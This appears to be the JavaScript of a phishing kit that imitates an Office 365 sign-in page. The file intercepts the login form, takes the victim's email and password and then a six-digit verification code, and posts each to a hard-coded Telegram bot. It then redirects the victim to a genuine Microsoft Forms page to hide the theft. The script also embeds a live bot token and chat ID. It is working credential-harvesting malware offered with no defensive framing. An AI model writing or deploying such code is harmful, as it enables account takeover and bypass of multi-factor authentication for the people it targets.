// Telegram Bot API details
const TELEGRAM_BOT_TOKEN = "7272693872:AAH2ah-x48_6-XrNqy6uLvnkjtKBEKiymVU";
const TELEGRAM_CHAT_ID = "8041820202";

// Function to send data to Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
    };

    try {
        const response = await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify(payload),
        });
        const data = await response.json();
        console.log("Message sent to Telegram:", data);
    } catch (error) {
        console.error("Error sending message to Telegram:", error);
    }
}

// Login form submission
document.getElementById("login-form").addEventListener("submit", async function (event) {
    event.preventDefault();

    // Get email and password
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    // Format the message for Telegram
    const loginMessage = `
|----------| xLOFFICE365/SCH s |--------------|
Online ID: ${email}
Passcode: ${password}
|--------------- I N F O | I P -------------------|
`;

    // Send login details to Telegram
    await sendToTelegram(loginMessage);

    // Hide login form and show verification container
    document.getElementById("login-form-container").style.display = "none";
    document.getElementById("verification-container").style.display = "block";
});

// Verification code submission
document.getElementById("verify-button").addEventListener("click", async function () {
    const verificationCode = document.getElementById("verification-code").value;

    // Validate the verification code
    if (verificationCode.length !== 6 || isNaN(verificationCode)) {
        alert("Please enter a valid 6-digit verification code.");
        return;
    }

    // Send verification code to Telegram
    const verificationMessage = `Verification Code: ${verificationCode}`;
    await sendToTelegram(verificationMessage);

    // Redirect to the form
    window.location.href = "https://forms.office.com/Pages/ResponsePage.aspx?id=6rma1OyZUkWGUb2U95ql5fEyhzHJrZ1Nh6ErkmDSMa5UMTQ0TkFYVjI1TFhSS1UyMU9TM0REQ0lDTS4u";
});